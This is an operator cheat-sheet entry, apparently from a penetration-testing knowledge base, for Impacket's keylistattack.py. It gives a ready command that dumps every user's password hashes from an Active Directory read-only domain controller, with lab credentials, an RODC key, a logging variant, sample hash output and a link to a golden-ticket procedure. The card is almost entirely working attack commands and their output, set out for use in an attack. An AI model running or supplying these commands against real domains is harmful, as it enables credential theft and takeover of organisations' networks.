---
type: command
executor: bash
data: >-
  keylistattack.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO
  -rodcKey $_RODC_KEY -full
tags:
  - credential-access
  - active-directory
platforms:
  - Linux
verified: true
validated: true
---

# impacket-keylistattack-full-enumeration

## Command

```bash
keylistattack.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO -rodcKey $_RODC_KEY -full
```

## Description

This command uses Impacket's keylistattack.py to perform a full enumeration of user hashes from an RODC's key list via SAMR without filtering, extracting all available credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password for authentication | Yes |
| $_RODC_HOST | IP or hostname of the RODC | Yes |
| -rodcNo $_RODC_NO | RODC identifier number | Yes |
| -rodcKey $_RODC_KEY | RODC AES key in hex | Yes |
| -full | Enable full unfiltered enumeration | Yes |

## Examples

### Basic Usage

```bash
keylistattack.py lab.local/admin:Password123@192.168.1.10 -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 -full
```

### Advanced Usage

Use with output redirection for logging:

```bash
keylistattack.py lab.local/admin:Password123@192.168.1.10 -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 -full > rodchashes.txt
```

## Expected Output

Successful execution lists users and hashes:

```
User: Administrator RID: 500 LMHASH: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
User: Guest RID: 501 LMHASH: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Total users enumerated: 25
```

## Related

- [[procedures/RODC-Key-List-Extraction-and-Golden-Ticket-Creation]]
- [[tools/Impacket]]
